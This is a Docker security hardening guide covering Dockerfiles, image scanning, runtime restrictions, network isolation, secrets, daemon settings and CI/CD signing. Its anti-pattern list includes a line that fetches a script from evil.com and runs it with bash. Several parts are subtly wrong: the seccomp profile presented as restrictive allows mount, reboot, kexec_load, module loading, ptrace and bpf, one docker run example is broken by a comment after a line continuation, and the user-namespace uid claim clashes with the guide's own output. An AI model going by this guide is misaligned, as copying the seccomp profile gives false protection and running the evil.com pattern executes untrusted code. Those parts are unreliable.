# Docker Security Best Practices — Complete Guide
### Secure Images, Runtime, Networks & Supply Chain

---

## Table of Contents

1. [Introduction](#introduction)
2. [Dockerfile Security](#dockerfile-security)
3. [Image Security](#image-security)
4. [Runtime Security](#runtime-security)
5. [Network Security](#network-security)
6. [Secrets Management](#secrets-management)
7. [Docker Daemon Security](#docker-daemon-security)
8. [Supply Chain Security](#supply-chain-security)
9. [Scanning Tools](#scanning-tools)
10. [CI/CD Security Integration](#cicd-integration)
11. [Docker Bench Security](#docker-bench)
12. [Best Practices Checklist](#checklist)

---

## Introduction

Docker containers share the host OS kernel. A misconfigured container can escalate privileges to the host, exfiltrate data, or become a pivot point for lateral movement in your network.

```
Container security attack surface:

Host OS Kernel        ← shared with all containers
Docker Daemon         ← privileged process on host
Container Runtime     ← runc, containerd
Container Image       ← could contain malware or vulnerabilities
Running Container     ← escape, privilege escalation
Network              ← lateral movement between containers
Secrets              ← credentials in images or env vars
```

---

## Dockerfile Security

### The Secure Dockerfile Template

```dockerfile
# ─── Stage 1: Build ───────────────────────────────
FROM node:18-alpine@sha256:abc123def456 AS builder

WORKDIR /app

# Copy dependency files first (better layer caching)
COPY package*.json ./

# Install ALL dependencies for build
RUN npm ci

# Copy source code
COPY . .

# Build production artifacts
RUN npm run build

# ─── Stage 2: Production ──────────────────────────
# Minimal base image — no build tools included
FROM node:18-alpine@sha256:abc123def456

# Update packages to get latest security patches
RUN apk update && \
    apk upgrade && \
    apk add --no-cache dumb-init && \
    rm -rf /var/cache/apk/*

# Create non-root user BEFORE copying files
RUN addgroup -g 1001 -S appgroup && \
    adduser -u 1001 -S appuser -G appgroup

WORKDIR /app

# Copy only production dependencies
COPY --from=builder --chown=appuser:appgroup /app/node_modules ./node_modules

# Copy built artifacts only — not source code
COPY --from=builder --chown=appuser:appgroup /app/dist ./dist
COPY --from=builder --chown=appuser:appgroup /app/package.json ./

# Switch to non-root user
USER appuser

# Use PORT > 1024 (non-root cannot bind < 1024)
EXPOSE 3000

# Health check
HEALTHCHECK --interval=30s --timeout=10s --start-period=30s --retries=3 \
  CMD wget -qO- http://localhost:3000/health || exit 1

# Use dumb-init to handle signals properly
ENTRYPOINT ["dumb-init", "--"]
CMD ["node", "dist/server.js"]
```

### Multi-stage Build Benefits

```
Stage 1 (builder):          Stage 2 (production):
  node:18-alpine              node:18-alpine (minimal)
  ALL npm packages            ONLY production packages
  Source code                 Built artifacts only
  Build tools                 No build tools
  Dev dependencies            No dev dependencies
  ~500 MB                     ~120 MB
                              Smaller attack surface ✅
                              Fewer vulnerabilities ✅
                              Faster to pull ✅
```

### What NOT to Do in Dockerfile

```dockerfile
# ❌ Never use latest tag
FROM node:latest
FROM ubuntu:latest

# ❌ Never run as root (default if no USER set)
CMD ["node", "server.js"]  # runs as root if no USER

# ❌ Never ADD remote URLs
ADD https://example.com/setup.sh /setup.sh  # unpredictable content

# ❌ Never store secrets in ENV
ENV DB_PASSWORD=mysecretpassword
ENV API_KEY=sk-abc123xyz

# ❌ Never install curl/wget and use them in same layer
RUN apt-get install -y curl && curl -o /install.sh https://evil.com/script.sh && bash /install.sh

# ❌ Never use COPY . . carelessly
COPY . .  # may copy .env files, SSH keys, secrets

# ❌ Never ignore .dockerignore
# Without .dockerignore: copies node_modules, .git, .env etc
```

### Proper .dockerignore

```
# .dockerignore
.git
.gitignore
node_modules
npm-debug.log
Dockerfile
.dockerignore
.env
.env.*
*.env
.aws
.ssh
*.pem
*.key
coverage/
test/
tests/
**/*.test.js
**/*.spec.js
README.md
docs/
```

---

## Image Security

### Use Minimal Base Images

```dockerfile
# Option 1 — Alpine (smallest general purpose)
FROM node:18-alpine    # ~50 MB vs ~900 MB for full node

# Option 2 — Distroless (Google — no shell at all)
FROM gcr.io/distroless/nodejs18-debian12
# No shell, no package manager, no unnecessary tools
# Attacker gets into container — no bash, no wget, nothing

# Option 3 — Scratch (absolute minimal — for Go/Rust static binaries)
FROM scratch
COPY --from=builder /app/server /server
CMD ["/server"]
# Zero attack surface — just your binary
```

### Comparison of Base Images

| Base Image | Size | Shell | Attack Surface | Use Case |
|-----------|------|-------|----------------|----------|
| ubuntu:22.04 | ~77MB | Yes | Large | Development |
| node:18 | ~900MB | Yes | Very Large | Avoid in prod |
| node:18-alpine | ~50MB | Yes (ash) | Small | Most Node apps |
| gcr.io/distroless | ~30MB | No | Minimal | Production |
| scratch | ~0MB | No | Zero | Static binaries |

### Pin Image Versions with Digest

```bash
# Get image digest
docker pull nginx:1.25.3
docker inspect nginx:1.25.3 | jq '.[0].RepoDigests[0]'
# Output: nginx@sha256:abc123def456...

# Use digest in Dockerfile
FROM nginx@sha256:abc123def456...
# Now the image is EXACTLY what you tested
# Even if tag is overwritten — you get the same image
```

### Scan Images with Trivy

```bash
# Scan image
trivy image myapp:1.0

# Scan with severity filter
trivy image --severity HIGH,CRITICAL myapp:1.0

# Fail on critical
trivy image --exit-code 1 --severity CRITICAL myapp:1.0

# Scan local Dockerfile
trivy config Dockerfile

# Scan filesystem
trivy fs .

# Output JSON report
trivy image --format json --output report.json myapp:1.0

# Scan with ignore file
cat > .trivyignore << EOF
CVE-2021-12345  # false positive — not exploitable in our context
CVE-2021-67890  # fix not available yet — accepted risk
EOF
trivy image --ignorefile .trivyignore myapp:1.0
```

---

## Runtime Security

### Run Containers with Minimal Privileges

```bash
# Run as non-root user (even if Dockerfile sets root)
docker run \
  --user 1000:1000 \
  myapp:1.0

# Read-only root filesystem
docker run \
  --read-only \
  --tmpfs /tmp \          # writable tmpfs for temp files
  myapp:1.0

# Drop all capabilities, add only needed
docker run \
  --cap-drop ALL \
  --cap-add NET_BIND_SERVICE \
  myapp:1.0

# No privilege escalation
docker run \
  --security-opt no-new-privileges \
  myapp:1.0

# All together — maximum security
docker run \
  --user 1000:1000 \
  --read-only \
  --tmpfs /tmp \
  --cap-drop ALL \
  --security-opt no-new-privileges \
  --security-opt seccomp=/path/to/seccomp.json \
  myapp:1.0
```

### Docker Compose Security

```yaml
# docker-compose.yml
version: '3.8'

services:
  app:
    image: myapp:1.0@sha256:abc123  # pinned digest
    user: "1000:1000"               # non-root
    read_only: true                 # read-only filesystem
    tmpfs:
      - /tmp                        # writable temp
    cap_drop:
      - ALL                         # drop all capabilities
    cap_add:
      - NET_BIND_SERVICE            # only what is needed
    security_opt:
      - no-new-privileges:true      # no privilege escalation
      - seccomp:seccomp.json        # seccomp profile
    environment:
      - NODE_ENV=production
      # No secrets in environment variables
    secrets:
      - db_password                 # use Docker secrets
    networks:
      - frontend
    deploy:
      resources:
        limits:
          cpus: '0.5'
          memory: 512M

  db:
    image: postgres:15-alpine@sha256:xyz789
    user: "999:999"
    read_only: true
    tmpfs:
      - /var/run/postgresql
      - /tmp
    environment:
      POSTGRES_PASSWORD_FILE: /run/secrets/db_password
    secrets:
      - db_password
    networks:
      - backend
    volumes:
      - pgdata:/var/lib/postgresql/data

secrets:
  db_password:
    file: ./secrets/db_password.txt

networks:
  frontend:
    driver: bridge
  backend:
    driver: bridge
    internal: true  # no internet access

volumes:
  pgdata:
    driver: local
```

### Seccomp Profile — Restrict System Calls

```json
{
  "defaultAction": "SCMP_ACT_ERRNO",
  "syscalls": [
    {
      "names": [
        "read", "write", "open", "close", "stat", "fstat",
        "lstat", "poll", "lseek", "mmap", "mprotect", "munmap",
        "brk", "rt_sigaction", "rt_sigprocmask", "rt_sigreturn",
        "ioctl", "pread64", "pwrite64", "readv", "writev",
        "access", "pipe", "select", "sched_yield", "mremap",
        "msync", "mincore", "madvise", "shmget", "shmat",
        "shmctl", "dup", "dup2", "pause", "nanosleep",
        "getitimer", "alarm", "setitimer", "getpid", "sendfile",
        "socket", "connect", "accept", "sendto", "recvfrom",
        "sendmsg", "recvmsg", "shutdown", "bind", "listen",
        "getsockname", "getpeername", "socketpair", "setsockopt",
        "getsockopt", "clone", "fork", "vfork", "execve",
        "exit", "wait4", "kill", "uname", "semget", "semop",
        "semctl", "shmdt", "msgget", "msgsnd", "msgrcv",
        "msgctl", "fcntl", "flock", "fsync", "fdatasync",
        "truncate", "ftruncate", "getdents", "getcwd", "chdir",
        "fchdir", "rename", "mkdir", "rmdir", "creat", "link",
        "unlink", "symlink", "readlink", "chmod", "fchmod",
        "chown", "fchown", "lchown", "umask", "gettimeofday",
        "getrlimit", "getrusage", "sysinfo", "times", "ptrace",
        "getuid", "syslog", "getgid", "setuid", "setgid",
        "geteuid", "getegid", "setpgid", "getppid", "getpgrp",
        "setsid", "setreuid", "setregid", "getgroups",
        "setgroups", "setresuid", "getresuid", "setresgid",
        "getresgid", "getpgid", "setfsuid", "setfsgid",
        "getsid", "capget", "capset", "rt_sigsuspend",
        "sigaltstack", "utime", "mknod", "uselib", "personality",
        "ustat", "statfs", "fstatfs", "sysfs", "getpriority",
        "setpriority", "sched_setparam", "sched_getparam",
        "sched_setscheduler", "sched_getscheduler",
        "sched_get_priority_max", "sched_get_priority_min",
        "sched_rr_get_interval", "mlock", "munlock", "mlockall",
        "munlockall", "vhangup", "modify_ldt", "pivot_root",
        "prctl", "arch_prctl", "adjtimex", "setrlimit", "chroot",
        "sync", "acct", "settimeofday", "mount", "umount2",
        "swapon", "swapoff", "reboot", "sethostname",
        "setdomainname", "iopl", "ioperm", "create_module",
        "init_module", "delete_module", "get_kernel_syms",
        "query_module", "quotactl", "nfsservctl", "getpmsg",
        "putpmsg", "afs_syscall", "tuxcall", "security",
        "gettid", "readahead", "setxattr", "lsetxattr",
        "fsetxattr", "getxattr", "lgetxattr", "fgetxattr",
        "listxattr", "llistxattr", "flistxattr", "removexattr",
        "lremovexattr", "fremovexattr", "tkill", "time",
        "futex", "sched_setaffinity", "sched_getaffinity",
        "set_thread_area", "io_setup", "io_destroy",
        "io_getevents", "io_submit", "io_cancel",
        "get_thread_area", "lookup_dcookie", "epoll_create",
        "epoll_ctl_old", "epoll_wait_old", "remap_file_pages",
        "getdents64", "set_tid_address", "restart_syscall",
        "semtimedop", "fadvise64", "timer_create",
        "timer_settime", "timer_gettime", "timer_getoverrun",
        "timer_delete", "clock_settime", "clock_gettime",
        "clock_getres", "clock_nanosleep", "exit_group",
        "epoll_wait", "epoll_ctl", "tgkill", "utimes",
        "vserver", "mbind", "set_mempolicy", "get_mempolicy",
        "mq_open", "mq_unlink", "mq_timedsend",
        "mq_timedreceive", "mq_notify", "mq_getsetattr",
        "kexec_load", "waitid", "add_key", "request_key",
        "keyctl", "ioprio_set", "ioprio_get", "inotify_init",
        "inotify_add_watch", "inotify_rm_watch", "migrate_pages",
        "openat", "mkdirat", "mknodat", "fchownat", "futimesat",
        "newfstatat", "unlinkat", "renameat", "linkat",
        "symlinkat", "readlinkat", "fchmodat", "faccessat",
        "pselect6", "ppoll", "unshare", "set_robust_list",
        "get_robust_list", "splice", "tee", "sync_file_range",
        "vmsplice", "move_pages", "utimensat", "epoll_pwait",
        "signalfd", "timerfd_create", "eventfd", "fallocate",
        "timerfd_settime", "timerfd_gettimerfd", "signalfd4",
        "eventfd2", "epoll_create1", "dup3", "pipe2",
        "inotify_init1", "preadv", "pwritev", "rt_tgsigqueueinfo",
        "perf_event_open", "recvmmsg", "fanotify_init",
        "fanotify_mark", "prlimit64", "name_to_handle_at",
        "open_by_handle_at", "clock_adjtime", "syncfs",
        "sendmmsg", "setns", "getcpu", "process_vm_readv",
        "process_vm_writev", "kcmp", "finit_module", "sched_setattr",
        "sched_getattr", "renameat2", "seccomp", "getrandom",
        "memfd_create", "kexec_file_load", "bpf", "execveat",
        "userfaultfd", "membarrier", "mlock2", "copy_file_range",
        "preadv2", "pwritev2", "pkey_mprotect", "pkey_alloc",
        "pkey_free", "statx", "io_pgetevents", "rseq"
      ],
      "action": "SCMP_ACT_ALLOW"
    }
  ]
}
```

---

## Network Security

### Docker Network Isolation

```bash
# Create isolated networks
docker network create frontend --driver bridge
docker network create backend --driver bridge
docker network create database --driver bridge --internal  # no external access

# Run app on multiple networks
docker run \
  --network frontend \
  --name webapp \
  myapp:1.0

# Connect to backend too
docker network connect backend webapp

# Database only on database network (no internet)
docker run \
  --network database \
  --name postgres \
  postgres:15-alpine

# Backend connects app to database
docker network connect database webapp
```

### Disable Inter-Container Communication

```bash
# Start Docker daemon with ICC disabled
dockerd --icc=false

# Or in daemon.json
cat /etc/docker/daemon.json
{
  "icc": false,
  "iptables": true
}
```

---

## Secrets Management

```bash
# WRONG — secrets in environment variables
docker run -e DB_PASSWORD=mysecret myapp:1.0
# Visible in: docker inspect, docker ps, process list

# WRONG — secrets in Dockerfile
ENV DB_PASSWORD=mysecret
# Stored in image — anyone who pulls image can read it

# RIGHT — Docker Secrets (Swarm mode)
echo "mysecretpassword" | docker secret create db_password -
docker service create \
  --secret db_password \
  myapp:1.0
# Secret mounted at /run/secrets/db_password — memory only

# RIGHT — Mount secrets at runtime
docker run \
  -v /secure/secrets/db_password:/run/secrets/db_password:ro \
  myapp:1.0

# RIGHT — Inject from vault at runtime
docker run \
  -e VAULT_TOKEN=$VAULT_TOKEN \
  myapp:1.0
# App fetches secret from Vault itself at startup

# RIGHT — AWS Secrets Manager via ECS
# In ECS task definition:
{
  "secrets": [{
    "name": "DB_PASSWORD",
    "valueFrom": "arn:aws:secretsmanager:region:account:secret:prod/db-password"
  }]
}
```

---

## Docker Daemon Security

### Secure daemon.json

```json
{
  "icc": false,
  "iptables": true,
  "no-new-privileges": true,
  "userns-remap": "default",
  "live-restore": true,
  "log-driver": "json-file",
  "log-opts": {
    "max-size": "10m",
    "max-file": "3"
  },
  "storage-driver": "overlay2",
  "userland-proxy": false,
  "seccomp-profile": "/etc/docker/seccomp.json"
}
```

### User Namespace Remapping

```
Without user namespace remapping:
  Container root (uid 0) = Host root (uid 0)
  Container escape = full root access on host ❌

With user namespace remapping:
  Container root (uid 0) = Host uid 65534 (nobody)
  Container escape = unprivileged user on host ✅
```

```bash
# Enable in daemon.json
{
  "userns-remap": "default"
}

# Verify
cat /etc/subuid
dockremap:231072:65536

cat /etc/subgid
dockremap:231072:65536
```

### Never Expose Docker Socket

```bash
# WRONG — exposes full Docker control to container
docker run -v /var/run/docker.sock:/var/run/docker.sock myapp

# Mounting the Docker socket = root access to the host
# Container can: create privileged containers
#                escape to host filesystem
#                access all other containers

# RIGHT — Use alternative solutions
# For CI/CD that needs Docker in Docker:
docker run --privileged docker:dind  # only in CI/CD runners
# Or use Kaniko, Buildah, Podman instead
```

---

## Supply Chain Security

### Docker Content Trust — Signed Images

```bash
# Enable Docker Content Trust
export DOCKER_CONTENT_TRUST=1

# Now push signs the image
docker push myapp:1.0
# Prompts for signing key — image is signed

# Pull verifies signature
docker pull myapp:1.0
# Fails if signature is invalid or missing

# Generate signing keys
docker trust key generate safar
docker trust signer add --key cert.pem safar myapp
```

### SBOM — Software Bill of Materials

```bash
# Generate SBOM with Syft
syft myapp:1.0 -o spdx-json > sbom.json
syft myapp:1.0 -o cyclonedx-json > sbom-cyclonedx.json

# Attach SBOM to image with Cosign
cosign attach sbom --sbom sbom.json myapp:1.0

# Sign the image with Cosign (keyless)
cosign sign myapp:1.0

# Verify signature
cosign verify myapp:1.0

# Verify and check SBOM
cosign verify-attestation myapp:1.0
```

---

## Scanning Tools

| Tool | Purpose | Command |
|------|---------|---------|
| Trivy | CVE scanning | `trivy image myapp:1.0` |
| Snyk | CVE + license | `snyk container test myapp:1.0` |
| Grype | CVE scanning | `grype myapp:1.0` |
| Hadolint | Dockerfile lint | `hadolint Dockerfile` |
| Docker Scout | CVE + supply chain | `docker scout cves myapp:1.0` |
| Syft | SBOM generation | `syft myapp:1.0` |
| Cosign | Image signing | `cosign sign myapp:1.0` |
| Dockle | CIS benchmark | `dockle myapp:1.0` |
| Docker Bench | Host security | `docker-bench-security` |

---

## CI/CD Security Integration

```yaml
# GitHub Actions — Docker security pipeline
- name: Lint Dockerfile
  uses: hadolint/hadolint-action@v3.1.0
  with:
    dockerfile: Dockerfile
    failure-threshold: warning

- name: Build image
  run: docker build -t myapp:${{ github.sha }} .

- name: Scan with Trivy
  uses: aquasecurity/trivy-action@master
  with:
    image-ref: myapp:${{ github.sha }}
    format: sarif
    output: trivy.sarif
    severity: CRITICAL,HIGH
    exit-code: 1

- name: Sign image with Cosign
  uses: sigstore/cosign-installer@main

- name: Sign
  run: |
    cosign sign --yes \
      ${{ env.REGISTRY }}/myapp:${{ github.sha }}
  env:
    COSIGN_EXPERIMENTAL: true

- name: Generate SBOM
  uses: anchore/sbom-action@v0
  with:
    image: myapp:${{ github.sha }}
    format: spdx-json
    output-file: sbom.json

- name: Attach SBOM
  run: |
    cosign attach sbom \
      --sbom sbom.json \
      ${{ env.REGISTRY }}/myapp:${{ github.sha }}
```

---

## Docker Bench Security

```bash
# Run Docker Bench Security
docker run -it --net host --pid host --userns host --cap-add audit_control \
  -e DOCKER_CONTENT_TRUST=$DOCKER_CONTENT_TRUST \
  -v /etc:/etc:ro \
  -v /lib/systemd/system:/lib/systemd/system:ro \
  -v /usr/bin/containerd:/usr/bin/containerd:ro \
  -v /usr/bin/runc:/usr/bin/runc:ro \
  -v /usr/lib/systemd:/usr/lib/systemd:ro \
  -v /var/lib:/var/lib:ro \
  -v /var/run/docker.sock:/var/run/docker.sock:ro \
  --label docker_bench_security \
  docker/docker-bench-security

# Output shows checks like:
# [PASS] 1.1.1 Ensure a separate partition for containers
# [WARN] 2.1 Ensure network traffic is restricted between containers
# [FAIL] 4.1 Ensure a user for the container has been created
```

---

## Best Practices Checklist

```
Dockerfile:
  □ Use specific image digest — not latest tag
  □ Use multi-stage builds
  □ Use minimal base image (alpine or distroless)
  □ Create and switch to non-root user
  □ Update packages in build stage
  □ Copy only necessary files
  □ Maintain proper .dockerignore
  □ No secrets in ENV or RUN commands
  □ Add HEALTHCHECK
  □ Use dumb-init for signal handling

Image:
  □ Scan with Trivy before pushing
  □ No CRITICAL CVEs in production images
  □ Sign images with Cosign
  □ Generate and attach SBOM
  □ Store in private registry
  □ Enable registry vulnerability scanning

Runtime:
  □ Run as non-root user
  □ Read-only root filesystem
  □ Drop ALL capabilities, add only needed
  □ no-new-privileges: true
  □ Set resource limits (CPU + memory)
  □ Use seccomp profile
  □ Use user namespace remapping

Network:
  □ Use custom bridge networks
  □ Isolate services on separate networks
  □ Database network internal: true
  □ Disable ICC if possible
  □ Never expose Docker socket

Secrets:
  □ No secrets in environment variables
  □ No secrets in Dockerfile
  □ No secrets in image layers
  □ Use Docker secrets or external vault
  □ Rotate secrets regularly

Daemon:
  □ Enable user namespace remapping
  □ Disable ICC
  □ Apply seccomp profile
  □ Enable live-restore
  □ Configure log rotation
  □ Regular Docker version updates

CI/CD:
  □ Lint Dockerfile with Hadolint
  □ Scan image with Trivy in pipeline
  □ Block on CRITICAL findings
  □ Sign images before push
  □ Generate SBOM for every build
  □ Only deploy signed images
```

---

*References: Docker Security Documentation | CIS Docker Benchmark | OWASP Docker Security Cheat Sheet | NIST Container Security Guide SP 800-190*
